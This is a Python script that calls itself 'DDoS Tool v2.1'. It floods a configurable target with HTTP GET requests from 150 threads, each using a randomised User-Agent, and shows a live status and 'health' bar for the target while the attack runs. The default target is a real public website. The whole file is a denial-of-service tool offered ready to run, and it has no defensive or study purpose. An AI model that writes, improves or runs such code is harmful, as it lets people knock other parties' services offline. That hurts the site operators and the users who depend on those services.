import os
import subprocess
import time
import socket
import threading
import signal
import re
import random

ThreadCount = 150
Target = "google.com"  # Change this to your IP (e.g., "8.8.8.8") or Domain
Port = 80
Payload = "GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n".format(Target)

# Global counters
uptime = 0
downtime = 0
running = True

def send_request():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TargetIP, Port))
        s.sendall(Payload.encode())
        response = s.recv(1024)
        s.close()
    except:
        pass

def percentage_bar(percent):
    bar_length = 50
    filled = int(bar_length * percent / 100)
    bar = '█' * filled + '░' * (bar_length - filled)
    return f"{percent}% [{bar}]"

def check_status():
    global uptime, downtime
    try:
        start = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TargetIP, Port))
        end = time.time()
        latency = (end - start) * 1000
        s.close()
        
        if latency < 1000:
            status = "UP"
            health = min(100, int(100 - (latency / 10)))
            if health > 100: health = 100
        else:
            status = "DOWN"
            health = 0
        
        if status == "UP":
            uptime += 1
        else:
            downtime += 1
        
        return status, latency, health
    except:
        status = "DOWN"
        latency = 0
        health = 0
        downtime += 1
        return status, latency, health

def run_ddos():
    threads = []
    for _ in range(ThreadCount):
        t = threading.Thread(target=send_request)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

def monitor():
    while running:
        status, latency, health = check_status()
        print(f"\rStatus: {status} | Ping: {latency:.3f} ms | Health: {health}% | Uptime: {uptime} | Downtime: {downtime} | {percentage_bar(health)}", end='')
        time.sleep(1)

def stop_script(signum, frame):
    global running
    running = False
    print("\nStopping attack...")

def random_payload():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
    ]
    return random.choice(user_agents)

def send_request_with_random_payload():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TargetIP, Port))
        user_agent = random_payload()
        payload = f"GET / HTTP/1.1\r\nHost: {Target}\r\nUser-Agent: {user_agent}\r\nConnection: keep-alive\r\n\r\n"
        s.sendall(payload.encode())
        response = s.recv(1024)
        s.close()
    except:
        pass

def run_ddos_with_random_payload():
    threads = []
    for _ in range(ThreadCount):
        t = threading.Thread(target=send_request_with_random_payload)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, stop_script)
    
    print(f"DDoS Tool v2.1 made by nxgq ")
    print(f"Target: {Target}")
    print(f"Thread Count: {ThreadCount}")
    print(f"Press CTRL+C to stop.\n")
    
    # Detect if input is IP or Domain and resolve IP
    try:
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', Target):
            TargetIP = Target
        else:
            TargetIP = socket.gethostbyname(Target)
    except:
        print("Error resolving target. Please check your IP or Domain.")
        exit()
    
    # Start monitoring thread
    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.start()
    
    # Start DDoS attack with random payload
    run_ddos_with_random_payload() 
